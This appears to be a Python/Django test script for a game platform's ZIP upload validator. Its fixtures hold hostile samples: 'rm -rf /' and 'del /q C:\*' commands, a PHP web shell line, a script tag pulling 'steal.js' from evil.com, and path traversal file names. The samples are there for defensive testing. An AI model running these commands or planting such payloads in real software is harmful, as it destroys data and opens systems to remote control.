#!/usr/bin/env python3
"""
File Upload Security Test Script
GameHost Platform - Light & Powerful Security Testing

Bu script file upload security sisteminin farklı senaryolarını test eder.
"""

import os
import sys
import django
import tempfile
import zipfile
from io import BytesIO

# Django setup
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'gamehost_project.settings')
django.setup()

from games.security import (
    validate_game_upload, 
    FileSecurityError, 
    get_security_summary,
    FileTypeValidator,
    ZipSecurityAnalyzer,
    FileNameSanitizer
)
from django.core.files.uploadedfile import SimpleUploadedFile

def create_test_zip(files_dict, zip_name="test.zip"):
    """Create a test ZIP file with given files"""
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for filename, content in files_dict.items():
            if isinstance(content, str):
                content = content.encode('utf-8')
            zip_file.writestr(filename, content)
    
    zip_buffer.seek(0)
    return SimpleUploadedFile(
        zip_name,
        zip_buffer.getvalue(),
        content_type='application/zip'
    )

def test_valid_webgl_game():
    """Test 1: Valid WebGL Game Upload"""
    print("\n🎮 Test 1: Valid WebGL Game Upload")
    print("=" * 50)
    
    # Create valid WebGL game structure
    valid_files = {
        'index.html': '''<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <title>Unity WebGL Player | My Game</title>
</head>
<body>
    <div id="unity-container"></div>
    <script src="Build/MyGame.loader.js"></script>
</body>
</html>''',
        'Build/MyGame.loader.js': 'console.log("Unity WebGL Loader");',
        'Build/MyGame.framework.js': 'var Unity = {};',
        'Build/MyGame.data': 'UNITY_GAME_DATA_BINARY',
        'TemplateData/style.css': 'body { margin: 0; }',
        'TemplateData/unity-logo.png': b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
    }
    
    test_zip = create_test_zip(valid_files)
    
    try:
        validate_game_upload(test_zip)
        print("✅ PASSED: Valid WebGL game accepted")
    except FileSecurityError as e:
        print(f"❌ FAILED: {e}")

def test_malicious_file_types():
    """Test 2: Malicious File Types"""
    print("\n🚫 Test 2: Malicious File Types Detection")
    print("=" * 50)
    
    malicious_files = {
        'index.html': '<!DOCTYPE html><html><body>Game</body></html>',
        'Build/game.js': 'var game = {};',
        'TemplateData/style.css': 'body { margin: 0; }',
        'malicious.exe': b'MZ\x90\x00\x03\x00\x00\x00',  # EXE header
        'script.bat': '@echo off\ndel /q C:\\*',
        'hidden/.secret.sh': '#!/bin/bash\nrm -rf /',
    }
    
    test_zip = create_test_zip(malicious_files)
    
    try:
        validate_game_upload(test_zip)
        print("❌ FAILED: Malicious files were not detected!")
    except FileSecurityError as e:
        print(f"✅ PASSED: Malicious files blocked - {e}")

def test_path_traversal():
    """Test 3: Path Traversal Attack"""
    print("\n🚫 Test 3: Path Traversal Attack Detection")
    print("=" * 50)
    
    traversal_files = {
        'index.html': '<!DOCTYPE html><html><body>Game</body></html>',
        'Build/game.js': 'var game = {};',
        'TemplateData/style.css': 'body { margin: 0; }',
        '../../../etc/passwd': 'root:x:0:0:root:/root:/bin/bash',
        'Build/../../../system32/evil.dll': b'EVIL_DLL_CONTENT',
    }
    
    test_zip = create_test_zip(traversal_files)
    
    try:
        validate_game_upload(test_zip)
        print("❌ FAILED: Path traversal attack not detected!")
    except FileSecurityError as e:
        print(f"✅ PASSED: Path traversal blocked - {e}")

def test_malicious_content():
    """Test 4: Malicious Content Patterns"""
    print("\n🚫 Test 4: Malicious Content Pattern Detection")
    print("=" * 50)
    
    malicious_content = {
        'index.html': '''<!DOCTYPE html>
<html>
<head>
    <script>
        // Malicious XSS attempt
        document.write('<script src="http://evil.com/steal.js"></script>');
        eval(atob('dmFyIGV2aWwgPSAiZGFuZ2Vyb3VzIjs='));
    </script>
</head>
<body onload="maliciousFunction()">
    Game Content
</body>
</html>''',
        'Build/game.js': 'var game = {}; eval("malicious code");',
        'TemplateData/style.css': 'body { margin: 0; }',
        'config.js': '''
// Server-side injection attempt
<?php
    system($_GET['cmd']);
    exec('rm -rf /');
?>
var config = {};
        '''
    }
    
    test_zip = create_test_zip(malicious_content)
    
    try:
        validate_game_upload(test_zip)
        print("❌ FAILED: Malicious content not detected!")
    except FileSecurityError as e:
        print(f"✅ PASSED: Malicious content blocked - {e}")

def test_compression_bomb():
    """Test 5: ZIP Bomb Detection"""
    print("\n💣 Test 5: Compression Bomb Detection")
    print("=" * 50)
    
    # Create a file with extremely high compression ratio (simulated)
    bomb_files = {
        'index.html': '<!DOCTYPE html><html><body>Game</body></html>',
        'Build/game.js': 'var game = {};',
        'TemplateData/style.css': 'body { margin: 0; }',
        'bomb.txt': 'A' * 1000000,  # 1MB of repeated characters
    }
    
    test_zip = create_test_zip(bomb_files)
    
    try:
        validate_game_upload(test_zip)
        print("⚠️  WARNING: Small bomb not detected (might be within thresholds)")
    except FileSecurityError as e:
        print(f"✅ PASSED: Compression bomb detected - {e}")

def test_filename_validation():
    """Test 6: Filename Validation"""
    print("\n📝 Test 6: Filename Validation & Sanitization")
    print("=" * 50)
    
    dangerous_filenames = [
        'con.html',        # Windows reserved name
        'file<script>.js', # Dangerous characters
        'a' * 300 + '.txt', # Too long filename
        'file|pipe.css',   # Pipe character
        'file"quote.js',   # Quote character
    ]
    
    for filename in dangerous_filenames:
        try:
            FileNameSanitizer.validate_filename(filename)
            print(f"❌ FAILED: Dangerous filename accepted: {filename}")
        except FileSecurityError as e:
            print(f"✅ PASSED: Dangerous filename blocked: {filename}")
        
        # Test sanitization
        try:
            sanitized = FileNameSanitizer.sanitize_filename(filename)
            print(f"🔧 SANITIZED: '{filename}' → '{sanitized}'")
        except Exception as e:
            print(f"⚠️  SANITIZATION ERROR: {e}")

def test_file_size_limit():
    """Test 7: File Size Limit"""
    print("\n📏 Test 7: File Size Limit Enforcement")
    print("=" * 50)
    
    # Create oversized file content
    large_content = b'X' * (60 * 1024 * 1024)  # 60MB (over 50MB limit)
    
    oversized_zip = SimpleUploadedFile(
        'large_game.zip',
        large_content,
        content_type='application/zip'
    )
    
    try:
        validate_game_upload(oversized_zip)
        print("❌ FAILED: Oversized file accepted!")
    except FileSecurityError as e:
        print(f"✅ PASSED: Oversized file blocked - {e}")

def test_invalid_file_types():
    """Test 8: Invalid File Type Detection"""
    print("\n🚫 Test 8: Invalid File Type Detection")
    print("=" * 50)
    
    # Create non-ZIP file
    fake_zip = SimpleUploadedFile(
        'fake.zip',
        b'This is not a ZIP file content',
        content_type='text/plain'
    )
    
    try:
        validate_game_upload(fake_zip)
        print("❌ FAILED: Invalid file type accepted!")
    except FileSecurityError as e:
        print(f"✅ PASSED: Invalid file type blocked - {e}")

def print_security_summary():
    """Print comprehensive security summary"""
    print("\n📊 SECURITY SYSTEM SUMMARY")
    print("=" * 50)
    
    summary = get_security_summary()
    
    print(f"Max File Size: {summary['max_file_size_mb']} MB")
    print(f"Allowed Extensions: {', '.join(summary['allowed_extensions'])}")
    print(f"Blocked Extensions: {len(summary['blocked_extensions'])} types")
    print(f"Max Files in ZIP: {summary['max_files_in_zip']}")
    print(f"Pattern Checks: {summary['pattern_checks']} malicious patterns")
    
    print("\n🛡️  Security Features:")
    for feature in summary['features']:
        print(f"  ✅ {feature}")

def main():
    """Run all security tests"""
    print("🔒 GAMEHOST PLATFORM - FILE SECURITY TESTING")
    print("=" * 60)
    print("Testing light but powerful file upload security system...")
    
    # Run all tests
    test_valid_webgl_game()
    test_malicious_file_types()
    test_path_traversal()
    test_malicious_content()
    test_compression_bomb()
    test_filename_validation()
    test_file_size_limit()
    test_invalid_file_types()
    
    # Print summary
    print_security_summary()
    
    print("\n" + "=" * 60)
    print("🎉 FILE SECURITY TESTING COMPLETED!")
    print("✅ Light, Fast & Comprehensive Protection Active")
    print("🚀 No External APIs Required - All Offline Validation")

if __name__ == "__main__":
    main() 